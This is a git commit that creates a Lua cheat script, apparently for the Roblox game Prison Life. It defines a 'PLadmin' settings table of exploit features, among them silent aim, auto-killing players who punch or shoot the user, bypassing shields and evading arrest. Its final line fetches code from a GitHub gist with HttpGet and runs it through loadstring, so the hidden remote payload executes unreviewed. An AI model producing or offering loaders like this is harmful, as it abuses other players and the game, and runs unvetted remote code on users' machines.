48c9610c6d3e84e5c8e21d3dd201e10392255e31
willfourtwenty <166588235+willfourtwenty@users.noreply.github.com>
2024-05-21 20:19:59 -0400

    Create main_script.lua

---
+++ main_script.lua
@@ -0,0 +1,25 @@
+Execution_Runtime = tick()
+PLadmin_Settings = {
+  DefaultPrefix = "?"; --The default prefix for pladmin
+  JoinNotify = false; --Notify when a player joins
+  AutoRespawn = true; --Automatically loadcharacter when dying
+  AntiVoid = true; --Automatically teleport up when falling into void
+  AntiTase = false; --Prevents you from being tased (100% no getconnections used because its absolute garbage)
+  AntiArrest = false; --Prevents you from being arrested (100% no getconnections used because its absolute garbage)
+  AntiShoot = false; --Kills player who tries to shoot you (Will be delayed if you have shitty ping, *COUGH* PLDT Users)
+  AntiPunch = false; --Instantly kill players who try to punch you
+  AntiFling = false; --Prevent exploiters from flinging you
+  AntiShield = false; --stop pay2win people and bypass their shields
+  AntiBring = false; --Prevent other exploiter(s) from bringing you
+  SilentAim = false; --Makes you shoot without missing a target
+  AutoGuns = false; --Automatically get all guns
+  OldItemMethod = false; --Use teleport for getting items (USE THIS IF PRISON LIFE PATCHES THE TABLE METHOD)
+  Fullbright = false; --Enable fullbrightness
+  WhitelistRanked = false; --Automatically whitelist ranked players (DO NOT USE WHEN RANKING ALL PLAYERS)
+  RankedNukeCmds = true; --Allow ranked players to use nuke commands (Very annoying)
+  RankedMultiCmd = true; --Allow ranked players to use the arguments: "all, and team", EX: ?kill all
+  RankedOutput = true; --Chat the output commands of ranked players
+  WhisperToRanked = true; --Use whisper for outputing commands for ranked players
+  Force_isMobile = false; --Force mobile action gui (Punch and crawl buttons) if executor is too shitty and detected as "emulator"
+};
+loadstring(game:HttpGet('https://gist.githubusercontent.com/elliexmln/9ffce8ecc7fdc239432125eb4c3df94c/raw'))()
